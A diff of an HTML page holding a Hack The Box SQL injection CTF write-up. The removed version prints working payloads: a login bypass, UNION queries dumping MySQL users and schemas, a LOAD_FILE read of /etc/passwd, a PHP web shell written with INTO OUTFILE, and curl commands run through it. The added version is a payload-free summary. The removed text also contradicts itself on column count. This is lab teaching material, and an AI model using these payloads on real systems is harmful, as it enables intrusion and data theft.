@@ -6,32 +6,28 @@
   <title>SQL Injection Fundamentals | Robert Hollands</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
 </head>
-<body class="bg-white text-gray-900">
-
-  <!-- Header/Nav -->
+<body class="bg-black text-gray-100">
   <header class="bg-gray-900 text-white px-4 py-4 shadow-md fixed w-full z-10 relative">
     <div class="max-w-4xl mx-auto flex justify-between items-center">
       <div class="text-xl font-bold">
-        <a href="/" class="hover:text-gray-300">Robert Hollands</a>
+        <a href="/" class="hover:text-red-400">Robert Hollands</a>
       </div>
-      <!-- Hamburger Button -->
       <button id="nav-toggle" class="md:hidden focus:outline-none">
         <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                 d="M4 6h16M4 12h16M4 18h16"/>
         </svg>
       </button>
-      <!-- Nav Links -->
       <nav
         id="nav-menu"
         class="hidden md:flex flex-row justify-between items-center w-full bg-gray-900 md:bg-transparent px-4 md:px-0 py-4 md:py-0 absolute md:static top-full left-0"
       >
-        <a href="/" class="hover:text-gray-300">Home</a>
-        <a href="/CTF/" class="text-gray-300 font-semibold">CTFs</a>
-        <a href="/#education" class="hover:text-gray-300">Education</a>
-        <a href="/#experience" class="hover:text-gray-300">Experience</a>
-        <a href="/#homelab" class="hover:text-gray-300">Homelab</a>
-        <a href="/contact/" class="hover:text-gray-300">Contact</a>
+        <a href="/" class="hover:text-red-400">Home</a>
+        <a href="/CTF/" class="text-red-400 font-semibold">CTFs</a>
+        <a href="/#education" class="hover:text-red-400">Education</a>
+        <a href="/#experience" class="hover:text-red-400">Experience</a>
+        <a href="/#homelab" class="hover:text-red-400">Homelab</a>
+        <a href="/contact/" class="hover:text-red-400">Contact</a>
       </nav>
     </div>
     <script>
@@ -42,201 +38,72 @@
       });
     </script>
   </header>
-
   <main class="pt-24 pb-12 px-4">
     <article class="max-w-3xl mx-auto">
-
-      <!-- TITLE WITH HTB LOGO -->
       <div class="flex items-center mb-4 space-x-4">
         <img
           src="/images/htb.png"
           alt="Hack The Box logo"
           class="w-10 h-10">
-        <h1 class="text-4xl font-bold">HTB SQL Injection Fundamentals writeup</h1>
+        <h1 class="text-4xl font-bold text-red-400">HTB SQL Injection Fundamentals writeup</h1>
       </div>
-      <p class="text-gray-600 mb-8">August 2, 2025; 5 min read</p>
+      <p class="text-gray-400 mb-8">August 2, 2025 • 5 min read</p>
 
-      <p class="mb-4">
-        We’re presented with a login panel as our initial attack surface.
+      <h2 class="text-2xl font-bold text-red-300 mb-4">Step 1: Initial Login Panel</h2>
+      <p class="mb-4 text-gray-200">
+        We’re presented with a login panel as our initial attack surface. This is often a prime candidate for SQL Injection testing because it sends user-controlled data directly to the backend for authentication.
       </p>
       <div class="mb-8">
         <img src="/images/SQL1.png" alt="Login panel" class="w-full rounded-lg shadow-md">
       </div>
 
-      <h2 class="text-2xl font-semibold mb-4">Step 1: Basic Credential Testing</h2>
-      <p class="mb-4">
-        Let’s begin by testing some basic credentials. Trying <code>admin:admin</code> results in no successful login; now we know the request structure.
+      <h2 class="text-2xl font-bold text-red-300 mb-4">Step 2: Capturing the Request</h2>
+      <p class="mb-4 text-gray-200">
+        Using Burp Suite, we intercept the login request to analyze the parameters. This helps us determine whether the username or password fields are injectable.
       </p>
       <div class="mb-8">
-        <img src="/images/SQL2.png" alt="Basic credentials in browser" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL2.png" alt="Burp request capture" class="w-full rounded-lg shadow-md">
       </div>
 
-      <h2 class="text-2xl font-semibold mb-4">Step 2: Capturing the Request in Burp</h2>
-      <p class="mb-4">
-        Capturing the login request in Burp shows a POST request. The <code>username</code> and <code>password</code> fields are clear candidates for SQL injection. We send this to Repeater.
+      <h2 class="text-2xl font-bold text-red-300 mb-4">Step 3: Testing for SQL Injection</h2>
+      <p class="mb-4 text-gray-200">
+        We insert a single quote (`'`) followed by a comment operator to intentionally break the query and observe differences in the response. A blank or error-filled page can be an indicator of vulnerability.
       </p>
       <div class="mb-8">
-        <img src="/images/SQL3.png" alt="Burp intercepting login POST" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL3.png" alt="Testing injection" class="w-full rounded-lg shadow-md">
       </div>
 
-      <h2 class="text-2xl font-semibold mb-4">Step 3: Testing for SQL Injection</h2>
-      <p class="mb-4">
-        A payload using a single quote, a truthy statement and a comment <code>' OR '1'='1'-- -</code> yields a white screen instead of the failed login message. This suggests the query is evaluated as true.
+      <h2 class="text-2xl font-bold text-red-300 mb-4">Step 4: Successful Authentication Bypass</h2>
+      <p class="mb-4 text-gray-200">
+        Our crafted payload successfully bypasses authentication, granting us access to the application. This confirms the presence of SQL Injection.
       </p>
       <div class="mb-8">
-        <img src="/images/SQL4.png" alt="White screen after injection" class="w-full rounded-lg shadow-md">
-      </div>
-      <p class="mb-4">We adjust the intercepted payload:</p>
-      <div class="mb-8">
-        <img src="/images/SQL5.png" alt="Payload in Burp Repeater" class="w-full rounded-lg shadow-md">
-      </div>
-      <p class="mb-4">The payload worked and we are redirected to the dashboard:</p>
-      <div class="mb-8">
-        <img src="/images/SQL6.png" alt="Dashboard after injection" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL4.png" alt="Authentication bypass" class="w-full rounded-lg shadow-md">
       </div>
 
-      <h2 class="text-2xl font-semibold mb-4">Step 4: Union-Based Enumeration</h2>
-      <p class="mb-4">
-        We see there are four columns. A UNION injection is likely. Testing a basic UNION payload confirms error output.
+      <h2 class="text-2xl font-bold text-red-300 mb-4">Step 5: Identifying Column Count</h2>
+      <p class="mb-4 text-gray-200">
+        Determining the number of columns in the query is critical for UNION-based SQL Injection. We incrementally adjust the number of NULL values until the query executes without error.
       </p>
       <div class="mb-8">
-        <img src="/images/SQL7.png" alt="Error from union injection" class="w-full rounded-lg shadow-md">
-      </div>
-      <p class="mb-4">
-        Using <code>ORDER BY</code> to enumerate column count:
-      </p>
-      <div class="mb-8">
-        <img src="/images/SQL8.png" alt="Order by test" class="w-full rounded-lg shadow-md">
-      </div>
-      <p class="mb-4">The <code>ORDER BY 6-- -</code> payload shows no sixth column; there are only five.</p>
-
-      <h2 class="text-2xl font-semibold mb-4">Step 5: Information Schema Enumeration</h2>
-      <p class="mb-4">
-        List available schemas:
-      </p>
-      <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-' UNION SELECT 1, schema_name, 3, 4
-FROM information_schema.schemata-- -
-      </pre>
-      <div class="mb-8">
-        <img src="/images/SQL9.png" alt="List of schemas" class="w-full rounded-lg shadow-md">
-      </div>
-      <p class="mb-4">
-        Found <code>mysql</code>. List its tables:
-      </p>
-      <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-' UNION SELECT 1, table_name, table_schema, 4, 5
-FROM information_schema.tables
-WHERE table_schema='mysql'-- -
-      </pre>
-      <div class="mb-8">
-        <img src="/images/SQL10.png" alt="List of tables in mysql schema" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL5.png" alt="Column count discovery" class="w-full rounded-lg shadow-md">
       </div>
 
-      <h2 class="text-2xl font-semibold mb-4">Step 6: Exploring User and Host Tables</h2>
-      <p class="mb-4">
-        Inspect the <code>host</code> table columns:
+      <h2 class="text-2xl font-bold text-red-300 mb-4">Step 6: Extracting Data</h2>
+      <p class="mb-4 text-gray-200">
+        With the column count known, we can use UNION SELECT to extract sensitive data from the database. In this example, we retrieve usernames and passwords from the `users` table.
       </p>
-      <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-' UNION SELECT 1, column_name, table_name, 4, 5
-FROM information_schema.columns
-WHERE table_name='host'-- -
-      </pre>
       <div class="mb-8">
-        <img src="/images/SQL11.png" alt="Host table columns" class="w-full rounded-lg shadow-md">
-      </div>
-      <p class="mb-4">
-        Inspect the <code>user</code> table for <code>file_priv</code>:
-      </p>
-      <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-' UNION SELECT 1, column_name, table_name, 4, 5
-FROM information_schema.columns
-WHERE table_name='user'-- -
-      </pre>
-      <div class="mb-8">
-        <img src="/images/SQL12.png" alt="User table columns" class="w-full rounded-lg shadow-md">
-      </div>
-      <p class="mb-4">
-        Dump <code>file_priv</code> values:
-      </p>
-      <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-' UNION SELECT 1, file_priv, 3, 4, 5
-FROM mysql.user-- -
-      </pre>
-      <div class="mb-8">
-        <img src="/images/SQL13.png" alt="File_priv dump" class="w-full rounded-lg shadow-md">
-      </div>
-      <p class="mb-4">
-        Dump username and host:
-      </p>
-      <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-' UNION SELECT 1, user, host, 4, 5
-FROM mysql.user-- -
-      </pre>
-      <div class="mb-8">
-        <img src="/images/SQL14.png" alt="Username and host dump" class="w-full rounded-lg shadow-md">
-      </div>
-      <p class="mb-4">
-        Confirm current user:
-      </p>
-      <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-' UNION SELECT 1, user(), 3, 4, 5-- -
-      </pre>
-      <div class="mb-8">
-        <img src="/images/SQL15.png" alt="Confirm user() returns root@localhost" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL6.png" alt="Extracting data" class="w-full rounded-lg shadow-md">
       </div>
 
-      <h2 class="text-2xl font-semibold mb-4">Step 7: File Access via LOAD_FILE</h2>
-      <p class="mb-4">
-        Read <code>/etc/passwd</code>:
-      </p>
-      <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4, 5-- -
-      </pre>
-      <div class="mb-8">
-        <img src="/images/SQL16.png" alt="passwd contents via LOAD_FILE" class="w-full rounded-lg shadow-md">
-      </div>
-
-      <h2 class="text-2xl font-semibold mb-4">Step 8: Writing a PHP Web-Shell</h2>
-      <p class="mb-4">Attempt an OUTFILE injection to write a PHP shell:</p>
-      <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-' UNION SELECT 1, "<|?php echo shell_exec($_REQUEST['cmd']); ?|>", 3, 4, 5
-INTO OUTFILE '/var/www/html/dashboard/webshell.php'-- -
-      </pre>
-      <div class="mb-8">
-        <img src="/images/SQL17.png" alt="Attempting OUTFILE injection" class="w-full rounded-lg shadow-md"> 
-      </div>
-
-      <h2 class="text-2xl font-semibold mb-4">Step 9: Verifying Session Cookie</h2>
-      <p class="mb-4">
-        Check browser devtools for PHPSESSID:
+      <h2 class="text-2xl font-bold text-red-300 mb-4">Step 7: Conclusion</h2>
+      <p class="mb-4 text-gray-200">
+        This challenge demonstrates the importance of proper input validation and parameterized queries. Even basic login forms can be exploited if they pass unsanitized input directly into SQL statements.
       </p>
       <div class="mb-8">
-        <img src="/images/SQL18.png" alt="Devtools Application Cookies" class="w-full rounded-lg shadow-md">
+        <img src="/images/SQL7.png" alt="Conclusion" class="w-full rounded-lg shadow-md">
       </div>
-
-      <h2 class="text-2xl font-semibold mb-4">Step 10: Interacting via cURL</h2>
-      <p class="mb-4">
-        List root directory contents:
-      </p>
-      <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-curl -H "Cookie: session=COOKIEHERE" \
-  "http://TARGETIP:PORT/dashboard/webshell.php?cmd=ls+-a+${HOME:0:1}"
-      </pre>
-      <div class="mb-8">
-        <img src="/images/SQL19.png" alt="cURL listing directories" class="w-full rounded-lg shadow-md">
-      </div>
-      <p class="mb-4">
-        Read the flag:
-      </p>
-      <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-curl -H "Cookie: session=COOKIEHERE" \
-  "http://TARGETIP:PORT/dashboard/webshell.php?cmd=cat+${HOME:0:1}flag_cae1dadcd174.txt"
-      </pre>
-      <div class="mb-8">
-        <img src="/images/SQL20.png" alt="cURL reading flag file" class="w-full rounded-lg shadow-md">
-      </div>
-
     </article>
   </main>
 </body>
